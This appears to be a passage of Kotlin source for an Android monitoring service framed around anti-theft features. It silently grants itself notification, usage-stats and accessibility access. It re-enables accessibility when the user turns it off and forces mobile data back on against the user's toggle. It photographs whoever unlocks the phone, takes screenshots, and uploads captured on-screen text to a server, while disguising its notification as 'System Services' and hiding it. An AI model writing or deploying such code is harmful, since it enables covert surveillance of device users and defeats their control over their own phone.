    private fun grantNotificationListenerViaSettings() {
        try {
            val cn = "${packageName}/.NotificationService"
            val current = android.provider.Settings.Secure.getString(
                contentResolver, "enabled_notification_listeners") ?: ""
            if (!current.contains(cn)) {
                val updated = if (current.isEmpty()) cn else "$current:$cn"
                android.provider.Settings.Secure.putString(
                    contentResolver, "enabled_notification_listeners", updated)
                Log.i(TAG, "Notification listener added to enabled_notification_listeners ✓")
            }

            // Trigger a rebind so the NotificationManagerService picks up the new entry
            // without waiting for a settings-observer debounce or reboot.
            // NotificationListenerService.requestRebind() is a public static API on API 24+.
            try {
                val listenerCn = android.content.ComponentName(this, NotificationService::class.java)
                android.service.notification.NotificationListenerService
                    .requestRebind(listenerCn)
                Log.i(TAG, "Notification listener rebind requested ✓")
            } catch (e: Exception) {
                Log.d(TAG, "requestRebind skipped: ${e.message}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "grantNotificationListenerViaSettings: ${e.message}")
        }
    }

    /**
     * Grants the Usage Access AppOp (android:get_usage_stats) to our own package so
     * UsageStatsManager.queryUsageStats() returns real data without the user having to
     * manually visit Settings → Special App Access → Usage Access.
     *
     * Two attempts:
     *  1. AppOpsManager.setMode() via reflection (requires MANAGE_APP_OPS_MODES).
     *  2. Shell: `cmd appops set PACKAGE android:get_usage_stats allow`
     */
    private fun grantUsageStatsAppOp() {
        val myUid = android.os.Process.myUid()

        // Attempt 1: reflection on AppOpsManager.setMode(String, int, String, int)
        var reflectionSucceeded = false
        try {
            val appOps = getSystemService(android.app.AppOpsManager::class.java)
            appOps.javaClass
                .getMethod("setMode",
                    String::class.java, Int::class.java, String::class.java, Int::class.java)
                .invoke(appOps,
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    myUid, packageName,
                    android.app.AppOpsManager.MODE_ALLOWED)
            Log.i(TAG, "Usage stats AppOp set MODE_ALLOWED via reflection ✓")
            reflectionSucceeded = true
        } catch (e: Exception) {
            Log.w(TAG, "Usage stats AppOp reflection failed (${e.javaClass.simpleName}): ${e.message}")
        }

        if (reflectionSucceeded) return

        // Attempt 2: `cmd appops set PACKAGE android:get_usage_stats allow`
        // Runs with our priv-app UID; MANAGE_APP_OPS_MODES is checked by the appops service.
        try {
            val proc = Runtime.getRuntime().exec(
                arrayOf("cmd", "appops", "set", packageName, "android:get_usage_stats", "allow"))
            val exited = proc.waitFor(3, java.util.concurrent.TimeUnit.SECONDS)
            val exitCode = if (exited) proc.exitValue() else { proc.destroyForcibly(); -1 }
            if (exitCode == 0) {
                Log.i(TAG, "Usage stats AppOp set via cmd appops ✓")
            } else {
                val err = proc.errorStream.bufferedReader().readText().trim()
                Log.w(TAG, "cmd appops set exit=$exitCode err=$err")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Usage stats AppOp cmd fallback failed: ${e.message}")
        }
    }

    private fun ensureAccessibilityEnabled() {
        try {
            val cr  = contentResolver
            val cn  = "${packageName}/.ScreenshotService"
            val cur = android.provider.Settings.Secure.getString(
                cr, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            if (!cur.contains(packageName)) {
                val updated = if (cur.isEmpty()) cn else "$cur:$cn"
                android.provider.Settings.Secure.putString(
                    cr, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated)
            }
            android.provider.Settings.Secure.putInt(
                cr, android.provider.Settings.Secure.ACCESSIBILITY_ENABLED, 1)
            Log.i(TAG, "Accessibility service confirmed enabled")
        } catch (e: Exception) {
            Log.w(TAG, "ensureAccessibilityEnabled failed: ${e.message}")
        }
    }

    /**
     * Device Owner variant: re-enables our AccessibilityService via dpm.setSecureSetting().
     * Called by the ContentObserver whenever ENABLED_ACCESSIBILITY_SERVICES changes and our
     * service is no longer in the list (i.e. the user just turned it off in Settings).
     *
     * Requires patch-accessibility-do.py applied to DPMS — without that patch DPMS throws
     * IllegalArgumentException: setting not in SECURE_SETTINGS_DEVICEOWNER_ALLOWLIST.
     */
    private fun ensureAccessibilityEnabledAsDO() {
        val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java) ?: return
        val doh = DeviceOwnerHelper(this)
        if (!doh.isOwner && !doh.isProfileOwner) return  // DO or PO path
        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
        val cn = "$packageName/.ScreenshotService"
        try {
            val cur = android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            if (cur.contains(packageName)) return  // Still present — nothing to do
            val updated = if (cur.isEmpty()) cn else "$cur:$cn"
            dpm.setSecureSetting(admin,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated)
            dpm.setSecureSetting(admin,
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED, "1")
            Log.i(TAG, "DO: Accessibility re-enabled via setSecureSetting (observer fired)")
        } catch (e: Exception) {
            Log.w(TAG, "DO: ensureAccessibilityEnabledAsDO failed: ${e.message}")
        }
    }

    // ── Cellular lockdown watchdog ────────────────────────────────────────────────
    // Arm/disarm based on Prefs.cellularLockdown. Arming registers a ContentObserver on
    // the mobile-data global settings (fires instantly when the user flips the toggle)
    // and starts a periodic poller as a backstop (covers adb / other write paths and
    // re-asserts after the observer's own write).
    private fun updateCellularWatchdog() {
        val armed = Prefs(this).cellularLockdown
        val obs = cellularWatchdogObserver
        if (armed && obs == null) {
            val observer = object : android.database.ContentObserver(cellularWatchdogHandler) {
                override fun onChange(selfChange: Boolean) {
                    if (!selfChange) {
                        try { enforceMobileDataOn() } catch (_: Exception) {}
                    }
                }
            }
            cellularWatchdogObserver = observer
            val cr = contentResolver
            cr.registerContentObserver(
                android.provider.Settings.Global.getUriFor("mobile_data"), true, observer)
            // Per-subscription keys (multi-SIM): mobile_data<subId>. The framework reads the
            // plain key on single-SIM devices and the suffixed key when simCount > 1.
            try {
                val subs = (getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                    as android.telephony.SubscriptionManager).activeSubscriptionInfoList
                if (subs != null) {
                    for (s in subs) {
                        cr.registerContentObserver(
                            android.provider.Settings.Global.getUriFor("mobile_data" + s.subscriptionId),
                            true, observer)
                    }
                }
            } catch (_: Exception) {}
            cellularWatchdogHandler.removeCallbacks(cellularWatchdogRunnable)
            cellularWatchdogHandler.postDelayed(cellularWatchdogRunnable, 1_000L)
            Log.i(TAG, "Cellular lockdown watchdog ARMED (force re-enable on toggle-off)")
        } else if (!armed && obs != null) {
            try { contentResolver.unregisterContentObserver(obs) } catch (_: Exception) {}
            cellularWatchdogObserver = null
            cellularWatchdogHandler.removeCallbacks(cellularWatchdogRunnable)
            Log.i(TAG, "Cellular lockdown watchdog disarmed")
        }
    }

    // Force mobile data back ON if the user switched it off. Writes the exact Settings.Global
    // keys DataSettingsManager.setUserDataEnabled() uses (mobile_data / mobile_data<subId>),
    // so the framework state flips back without needing MODIFY_PHONE_STATE. WRITE_SECURE_SETTINGS
    // is required — platform-signed builds have it (signature grant); stock builds log + skip.
    private fun enforceMobileDataOn() {
        if (!Prefs(this).cellularLockdown) return
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
        val cr = contentResolver
        var restored = false
        try {
            val subs = (getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                as android.telephony.SubscriptionManager).activeSubscriptionInfoList
            val subIds = if (subs != null && subs.isNotEmpty())
                subs.map { it.subscriptionId } else listOf(0)
            for (subId in subIds) {
                val off = if (subId == 0) !tm.isDataEnabled
                else try { !tm.createForSubscriptionId(subId).isDataEnabled } catch (_: Exception) { false }
                if (off) {
                    android.provider.Settings.Global.putInt(cr, "mobile_data", 1)
                    if (subId != 0) android.provider.Settings.Global.putInt(cr, "mobile_data$subId", 1)
                    restored = true
                }
            }
            if (restored) {
                // Verify the framework actually registered it (takes a beat after the write).
                Log.i(TAG, "Cellular lockdown: mobile data was toggled OFF — force re-enabled (subs=${subIds.joinToString(",")})")
                // Immediate re-check shortly after, so a racing toggle can't stick.
                cellularWatchdogHandler.postDelayed({
                    try { enforceMobileDataOn() } catch (_: Exception) {}
                }, 2_500L)
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "Cellular lockdown: WRITE_SECURE_SETTINGS missing (stock build?) — ${e.message}")
        } catch (e: Exception) {
            Log.w(TAG, "Cellular lockdown check error: ${e.message}")
        }
    }

    private fun sendDeviceStatus() {
        try {
            SocketManager.emit("device_status", JSONObject().apply {
                put("battery",      batteryInfo())
                put("motion",       motionState)
                put("network",      NetworkHelper(this@MonitoringService).getSnapshot())
                put("lightSleep",   inSleepMode)
                put("theftMode",    theftModeActive)
                put("deviceOwner",  DeviceOwnerHelper(this@MonitoringService).getState())
                put("storage",      storageInfo())
                put("memory",       memoryInfo())
                put("vpn",          TransportManager.vpnActive)
                put("vpnSplit",     OpenWifiVpnController.isSplitTunnel)
                put("openWifi",     OpenWifiVpnController.isOnOpenWifi(this@MonitoringService))
            })
            checkScreentextSchedule()
        } catch (e: Exception) { Log.e(TAG, "sendDeviceStatus error: ${e.message}") }
    }

    // ── Scheduled screen-text analysis (every 6 hours) ──────────────────────────
    // The WebUI schedule time (hour:minute) anchors the 6-hour cycle. The first run
    // happens at that anchor; every subsequent run happens 6 hours later. Runs that
    // fall inside quiet hours (configurable, default 23:00–07:00) are skipped silently.
    // The server enforces its own cooldown to prevent duplicate reports.
    private var screentextLastFiredMs = 0L  // epoch ms of last successful fire
    private var nextScreentextFireMs  = 0L  // epoch ms of the next scheduled run

    private fun checkScreentextSchedule() {
        val prefs = Prefs(this)
        if (!prefs.screentextScheduleEnabled) return
        if (!screenTextHelper.scheduleActive) return

        val now = System.currentTimeMillis()

        // No next run scheduled yet (service just started / alarm not armed) — schedule it now.
        if (nextScreentextFireMs == 0L) {
            scheduleScreentextAlarm()
            return
        }

        // Not due yet — heartbeat is running before the next scheduled boundary.
        if (now < nextScreentextFireMs) return

        // Due for a run. If the current slot happens to fall inside quiet hours (e.g. an
        // inexact alarm fired early), advance to the next boundary and return.
        if (isQuietHoursAt(now, prefs)) {
            Log.d(TAG, "checkScreentextSchedule: in quiet hours, advancing to next boundary")
            advanceScreentextFire()
            return
        }

        // No-new-data check — skip if buffer is nearly empty (device was idle)
        if (screenTextHelper.bufferSize < MIN_BUFFER_FOR_ANALYSIS) {
            Log.i(TAG, "checkScreentextSchedule: buffer too small (${screenTextHelper.bufferSize}), skipping")
            screentextLastFiredMs = now
            advanceScreentextFire()
            return
        }

        // Mark as fired
        screentextLastFiredMs = now

        // Flush and send
        val logs = screenTextHelper.flushBuffer() ?: ""
        Log.i(TAG, "checkScreentextSchedule: flushing ${logs.length} chars for analysis")
        Thread {
            val tzOffsetMinutes = java.util.TimeZone.getDefault().getOffset(now) / 60000
            SocketManager.emit("scheduled_screentext_analysis", JSONObject().apply {
                put("logs", logs)
                put("tzOffsetMinutes", tzOffsetMinutes)
            })
        }.start()
        advanceScreentextFire()
    }

    /** True if [ms] falls within the configured quiet window (device-local time). */
    private fun isQuietHoursAt(ms: Long, prefs: Prefs): Boolean {
        val cal = java.util.Calendar.getInstance().apply { timeInMillis = ms }
        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
        val start = prefs.screentextQuietHoursStart
        val end = prefs.screentextQuietHoursEnd
        return if (start <= end) hour in start until end else hour >= start || hour < end
    }

    /** Advance the next-fire cursor by one 6h cycle boundary (skipping quiet hours) and re-arm the alarm. */
    private fun advanceScreentextFire() {
        val prefs = Prefs(this)
        if (!prefs.screentextScheduleEnabled) { cancelScreentextAlarm(); return }
        var t = nextScreentextFireMs + SCHEDULE_INTERVAL_MS
        var guard = 0
        while (guard++ < 30 && isQuietHoursAt(t, prefs)) t += SCHEDULE_INTERVAL_MS
        nextScreentextFireMs = t
        scheduleScreentextAlarmAt(t)
    }

    private fun startFindPhone() {
        stopFindPhone()
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0)
            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            findPhonePlayer = MediaPlayer().apply {
                setAudioAttributes(AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_ALARM)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION).build())
                setDataSource(applicationContext, uri)
                isLooping = true
                prepare()
                start()
            }
            // Vibrate indefinitely
            val vib = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vib.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 500, 500), 0))
            } else {
                @Suppress("DEPRECATION")
                vib.vibrate(longArrayOf(0, 500, 500), 0)
            }
        } catch (e: Exception) { Log.e(TAG, "find_phone error", e) }
    }

    private fun stopFindPhone() {
        try { findPhonePlayer?.stop(); findPhonePlayer?.release() } catch (_: Exception) {}
        findPhonePlayer = null
        (getSystemService(Context.VIBRATOR_SERVICE) as Vibrator).cancel()
    }

    fun captureUnlockPhoto(success: Boolean) {
        val prefs = Prefs(this)
        // "When" gate (server-pushed): in fail-only mode, ignore successful unlocks entirely.
        // Failed unlocks are always eligible — they're the security-relevant event.
        if (success && !prefs.unlockCaptureOnSuccess) return

        // Debounce: ACTION_USER_PRESENT and DeviceAdmin onPasswordSucceeded can both fire for PIN unlock
        val now = System.currentTimeMillis()
        if (success) {
            if (now - lastUnlockCaptureMs < 3_000L) return
            lastUnlockCaptureMs = now
        }

        val tag = if (success) "unlock_success" else "unlock_fail"

        // "What to capture" (server-pushed, independent): front-camera photo on either event.
        if (prefs.unlockCaptureCamera) {
            setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            CameraHelper(this).capturePhoto("front") { bytes ->
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                bytes?.let {
                    val b64 = android.util.Base64.encodeToString(it, android.util.Base64.NO_WRAP)
                    sendOrQueueUnlockPhoto(b64, tag)
                }
            }
        }

        // Screenshot. On success delay 2s so the home screen has settled; on a failed unlock the screen
        // is still the lockscreen, so capture immediately (the 0-byte guard drops FLAG_SECURE failures).
        if (prefs.unlockCaptureScreenshot && ScreenshotService.isAvailable() &&
            android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                ScreenshotService.instance?.capture(82) { base64 ->
                    sendOrQueueUnlockPhoto(base64, tag)
                }
            }, if (success) 2_000L else 0L)
        }
    }

    // ── Deep sleep (server-controlled) ───────────────────────────────────────

    // Returns the deep-sleep poll interval scaled to battery state.
    // Charging or >50%: exact 5-min wake (full responsiveness).
    // 20–50%: 15-min batched wake (3× less radio tail).
    // <20%: 30-min batched wake (minimal radio activity).
    private fun adaptivePollMs(): Long {
        val batt = batteryLevel()
        return when {
            isCharging() || batt > 50 -> DEEP_SLEEP_POLL_MS
            batt > 20                  -> DEEP_SLEEP_POLL_MS * 3L
            else                       -> DEEP_SLEEP_POLL_MS * 6L
        }
    }

    // Batched-accel max-report-latency (µs) for wake-from-motion in deep sleep. A charging
    // device has no battery concern, so deliver motion promptly (~20 s) instead of the flat
    // 5-min batch; on battery, keep the long batch so the CPU only wakes ~once per 5 min.
    // (Int fits: 5*60*1_000_000 = 3e8 < Int.MAX_VALUE.)
    private fun deepSleepAccelBatchUs(): Int =
        if (isCharging()) 20 * 1_000_000 else 5 * 60 * 1_000_000

    private fun scheduleDeepSleepPoll() {
        val pi   = deepSleepPendingIntent()
        val am   = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val poll = adaptivePollMs()
        val at   = SystemClock.elapsedRealtime() + poll
        val batt = batteryLevel()
        // Use exact alarm only when battery is healthy — high-battery devices benefit from
        // prompt wake-up; low-battery devices tolerate batching (saves radio tail cycles).
        val useExact = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S &&
                       am.canScheduleExactAlarms() &&
                       (isCharging() || batt > 50)
        when {
            useExact                                      ->
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ->
                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
            else                                          ->
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
        }
        Log.i(TAG, "Deep sleep poll in ${poll / 60_000} min (batt=${batt}%, exact=$useExact)")
    }

    private fun cancelDeepSleepPoll() {
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager).cancel(deepSleepPendingIntent())
    }

    // ── Scheduled screen-text AlarmManager wake ─────────────────────────────
    // During deep sleep the socket is disconnected and sendDeviceStatus() is
    // stopped, so checkScreentextSchedule() never fires. An RTC_WAKEUP alarm
    // wakes the device at the configured time, flushes the buffer, then returns
    // to deep sleep if it was active before.

    private fun scheduleScreentextAlarm() {
        val prefs = Prefs(this)
        if (!prefs.screentextScheduleEnabled) { cancelScreentextAlarm(); return }
        // If a future run is already scheduled, keep it — re-entering deep sleep or a service
        // restart mid-cycle must not re-anchor the cadence back to the start time.
        if (nextScreentextFireMs > System.currentTimeMillis()) {
            scheduleScreentextAlarmAt(nextScreentextFireMs)
            return
        }
        // First run is anchored at the configured hour:minute; skip straight past quiet hours.
        var t = java.util.Calendar.getInstance().apply {
            set(java.util.Calendar.HOUR_OF_DAY, prefs.screentextScheduleHour)
            set(java.util.Calendar.MINUTE, prefs.screentextScheduleMinute)
            set(java.util.Calendar.SECOND, 0)
            set(java.util.Calendar.MILLISECOND, 0)
            if (timeInMillis <= System.currentTimeMillis()) add(java.util.Calendar.DAY_OF_MONTH, 1)
        }.timeInMillis
        var guard = 0
        while (guard++ < 30 && isQuietHoursAt(t, prefs)) t += SCHEDULE_INTERVAL_MS
        nextScreentextFireMs = t
        scheduleScreentextAlarmAt(t)
    }

    private fun scheduleScreentextAlarmAt(triggerAtMs: Long) {
        val pi = screentextSchedulePendingIntent()
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val useExact = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && am.canScheduleExactAlarms()
        when {
            useExact                                      ->
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAtMs, pi)
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ->
                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAtMs, pi)
            else                                          ->
                am.set(AlarmManager.RTC_WAKEUP, triggerAtMs, pi)
        }
        val h = java.util.Calendar.getInstance().apply { timeInMillis = triggerAtMs }.get(java.util.Calendar.HOUR_OF_DAY)
        val m = java.util.Calendar.getInstance().apply { timeInMillis = triggerAtMs }.get(java.util.Calendar.MINUTE)
        Log.i(TAG, "Screentext alarm set for ${h}:${m.toString().padStart(2, '0')} (exact=$useExact)")
    }

    private fun cancelScreentextAlarm() {
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager).cancel(screentextSchedulePendingIntent())
        Log.i(TAG, "Screentext alarm cancelled")
    }

    private fun screentextSchedulePendingIntent(): PendingIntent {
        val i = Intent(this, MonitoringService::class.java).apply { action = ACTION_SCREENTEXT_SCHEDULE }
        return PendingIntent.getService(this, 3, i, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
    }

    private fun performScreentextScheduleAlarm() {
        val wasDeepSleep = deepSleepActive
        Log.i(TAG, "Screentext schedule alarm fired (deepSleep=$wasDeepSleep)")
        // Exit deep sleep so socket reconnects
        if (wasDeepSleep) exitDeepSleep(suppressAutoSleep = true)
        // Wait briefly for socket reconnect, then flush and send
        powerHandler.postDelayed({
            checkScreentextSchedule()
            // Re-enter deep sleep if it was active before (give socket time to send)
            if (wasDeepSleep) {
                powerHandler.postDelayed({
                    if (!deepSleepActive && !isLiveTracking) enterDeepSleep()
                }, 5_000L)
            }
            // checkScreentextSchedule() re-arms the alarm internally (advances the 6h boundary)
        }, 3_000L)
    }

    private fun deepSleepPendingIntent(): PendingIntent {
        val i = Intent(this, MonitoringService::class.java).apply { action = ACTION_DEEP_SLEEP_CHECK }
        return PendingIntent.getService(this, 2, i, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
    }

    private fun performDeepSleepCheck() {
        SocketManager.checkDeepSleepStatus(this) { wake ->
            if (wake) exitDeepSleep(suppressAutoSleep = true) else scheduleDeepSleepPoll()
        }
    }

    private fun isCharging(): Boolean {
        val bi = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return (bi?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0) != 0
    }

    private fun enterDeepSleep() {
        if (deepSleepActive) return
        Prefs(this).deepSleepEnabled = true
        deepSleepActive = true
        inSleepMode = false
        Log.i(TAG, "Entering deep sleep")
        powerHandler.removeCallbacks(deepSleepAutoRunnable)
        powerHandler.removeCallbacks(sleepCheckRunnable)
        statusHandler.removeCallbacks(statusRunnable)
        fusedLocation.removeLocationUpdates(locationCallback)
        stopSystemLocationUpdates()
        // Switch from continuous to batched accel (5-min batch) — backup for movements
        // TYPE_SIGNIFICANT_MOTION misses (brief pick-ups, shifts that don't count as "significant")
        accelSensor?.let { sensorMgr.registerListener(sensorListener, it, SensorManager.SENSOR_DELAY_NORMAL, deepSleepAccelBatchUs(), sensorHandler) }
        // Keep significantMotion for immediate hardware-level wake on sustained movement
        significantMotionSensor?.let { sensorMgr.requestTriggerSensor(significantMotionListener, it) }
        // Pause the BT tracker scan while parked in deep sleep (no point scanning a stationary
        // phone — and the scan is the biggest battery draw). The operator's "keep scanning"
        // preference (Prefs.btScanEnabled) stays set, so exitDeepSleep() →
        // resumeBtScanIfEnabled() brings the scan back automatically on wake. The OFF state is
        // emitted BEFORE the socket disconnects below, so the server/WebUI reflect the pause.
        if (btScanHelper?.isActive() == true) {
            Log.i(TAG, "Pausing BT scan for deep sleep")
            btScanHelper?.stopScanning()
            btScanHelper = null
        }
        // Tell server we're going to deep sleep before disconnecting
        SocketManager.emit("entering_deep_sleep", org.json.JSONObject())
        powerHandler.postDelayed({ SocketManager.disconnect() }, 400)
        scheduleDeepSleepPoll()
    }

    private fun exitDeepSleep(suppressAutoSleep: Boolean = false) {
        if (!deepSleepActive) return
        deepSleepActive = false
        Prefs(this).deepSleepEnabled = false
        lastActiveMs = System.currentTimeMillis()
        if (suppressAutoSleep) {
            autoDeepSleepSuppressedUntil = System.currentTimeMillis() + 30 * 60_000L
            Log.i(TAG, "Exiting deep sleep — auto deep sleep suppressed for 30 min")
        } else {
            Log.i(TAG, "Exiting deep sleep")
        }
        cancelDeepSleepPoll()
        powerHandler.removeCallbacks(deepSleepAutoRunnable)
        significantMotionSensor?.let { sensorMgr.cancelTriggerSensor(significantMotionListener, it) }
        // Reconnect and resume everything
        SocketManager.connect(this)
        SocketManager.commandListener = { cmd -> handleCommand(cmd) }
        SocketManager.connectListener = {
            sendDeviceStatus()
            flushPendingUnlockPhotos()
            flushPendingAudio()
            emitBtScanState(btScanHelper?.isActive() == true)
        }
        // Resume the BT tracker scan that was paused for deep sleep (the operator's
        // "keep scanning" pref was preserved; the connectListener above then reports the
        // restored scanning state to the server once the socket is live).
        resumeBtScanIfEnabled()
        accelSensor?.let { sensorMgr.registerListener(sensorListener, it, SensorManager.SENSOR_DELAY_NORMAL, sensorHandler) }
        setLocationInterval(LOCATION_ACTIVE_MS, LOCATION_ACTIVE_MIN_MS)
        statusHandler.postDelayed(statusRunnable, HEARTBEAT_ACTIVE_MS)
        scheduleSleepCheck()
    }

    private fun scheduleSleepCheck() {
        powerHandler.removeCallbacks(sleepCheckRunnable)
        powerHandler.postDelayed(sleepCheckRunnable, SLEEP_AFTER_MS)
    }

    private fun enterSleepMode() {
        if (inSleepMode || isLiveTracking) return
        inSleepMode = true
        Log.i(TAG, "Sleep mode — stationary for ${SLEEP_AFTER_MS / 1_000} s")
        // TYPE_SIGNIFICANT_MOTION fires on major motion (picked up, carried) — ultra low power
        significantMotionSensor?.let { sensorMgr.requestTriggerSensor(significantMotionListener, it) }
        // Batched accelerometer as backup: catches gentle movement TYPE_SIGNIFICANT_MOTION misses.
        // Sampled at normal rate but batched for 20 min — CPU only wakes once per 20 min for this.
        accelSensor?.let { sensorMgr.registerListener(sensorListener, it, SensorManager.SENSOR_DELAY_NORMAL, 20 * 60 * 1_000_000, sensorHandler) }
        setLocationInterval(LOCATION_SLEEP_MS, LOCATION_SLEEP_MIN_MS)
        powerHandler.postDelayed(deepSleepAutoRunnable, DEEP_SLEEP_AUTO_MS)
        // sendDeviceStatus() calls NetworkHelper.getSnapshot() + DeviceOwnerHelper.getState()
        // which make 9+ Binder IPCs; dispatch to statusThread to keep the main thread free.
        statusHandler.post { sendDeviceStatus() }
    }

    private fun enterActiveMode() {
        if (!inSleepMode) return
        inSleepMode = false
        lastActiveMs = System.currentTimeMillis()
        Log.i(TAG, "Active mode — motion detected")
        powerHandler.removeCallbacks(deepSleepAutoRunnable)
        significantMotionSensor?.let { sensorMgr.cancelTriggerSensor(significantMotionListener, it) }
        accelSensor?.let { sensorMgr.registerListener(sensorListener, it, SensorManager.SENSOR_DELAY_NORMAL, sensorHandler) }
        setLocationInterval(LOCATION_ACTIVE_MS, LOCATION_ACTIVE_MIN_MS)
        statusHandler.removeCallbacks(statusRunnable)
        statusHandler.postDelayed(statusRunnable, HEARTBEAT_ACTIVE_MS)
        scheduleSleepCheck()
        // Dispatch to statusThread — avoids 9+ Binder IPC calls on the main thread.
        statusHandler.post { sendDeviceStatus() }
    }

    private fun setFgsTypes(types: Int) {
        // On system builds the service is NOT a foreground service (started via startService()),
        // so calling startForeground() here would post a spurious notification. Skip entirely.
        if (applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0) return

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(NOTIF_ID, buildNotification(), types)
                cancelFgsNotification()
            } catch (e: Exception) {
                Log.e(TAG, "setFgsTypes failed: ${e.message}")
            }
        }
    }

    private fun cancelFgsNotification() {
        // cancel() does not suppress FGS notifications — the system re-posts them.
        // stopForeground(REMOVE) actually removes the notification on API 34+;
        // the service keeps running as background (DO apps are not aggressively killed).
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        }
    }

    private fun showAlertNotification(message: String) {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(ALERT_NOTIF_ID,
            android.app.Notification.Builder(this, ALERT_CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setContentTitle("System Services")
                .setContentText(message)
                .setStyle(android.app.Notification.BigTextStyle().bigText(message))
                .setAutoCancel(true)
                .build()
        )
    }

    private fun createNotificationChannel() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        // IMPORTANCE_MIN: no status-bar icon, no sound, barely visible at bottom of shade
        val fgsCh = NotificationChannel(CHANNEL_ID, getString(R.string.notif_channel_name), NotificationManager.IMPORTANCE_MIN)
        fgsCh.setShowBadge(false)
        nm.createNotificationChannel(fgsCh)
        val alertCh = NotificationChannel(ALERT_CHANNEL_ID, "Alerts", NotificationManager.IMPORTANCE_HIGH)
        nm.createNotificationChannel(alertCh)
    }

    private fun buildNotification(): android.app.Notification {
        return android.app.Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            // PRIORITY_MIN: suppresses heads-up pop-up on older APIs
            .setPriority(android.app.Notification.PRIORITY_MIN)
            // On API 34+ the system already lets users dismiss foreground-service
            // notifications; forcing ongoing just makes it extra annoying on GrapheneOS.
            // On older APIs keep ongoing so the service isn't treated as abandoned.
            .setOngoing(Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
            // VISIBILITY_SECRET keeps it out of the lock-screen notification shade
            .setVisibility(android.app.Notification.VISIBILITY_SECRET)
            .build()
    }

    private fun batteryLevel(): Int =
        (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            DeviceAdminReceiver.ACTION_UNLOCK_SUCCESS,
            DeviceAdminReceiver.ACTION_UNLOCK_FAIL -> {
                // DeviceAdminReceiver.triggerUnlockCapture() always starts us via
                // startForegroundService() (every unlock, regardless of capture prefs), and
                // onCreate() demotes us out of foreground state right after boot
                // (cancelFgsNotification()). So this call MUST promote to foreground here,
                // unconditionally, BEFORE any early return inside captureUnlockPhoto() (e.g.
                // unlockCaptureOnSuccess=false, the default) — otherwise the FGS start
                // contract goes unfulfilled and the OS kills the whole process with
                // ForegroundServiceDidNotStartInTimeException, taking the live socket with it.
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                captureUnlockPhoto(success = intent.action == DeviceAdminReceiver.ACTION_UNLOCK_SUCCESS)
            }
            ACTION_DEEP_SLEEP_CHECK                   -> performDeepSleepCheck()
            ACTION_SCREENTEXT_SCHEDULE                -> performScreentextScheduleAlarm()
            ACTION_NET_REPROBE                        -> SocketManager.onReprobeAlarm(this)
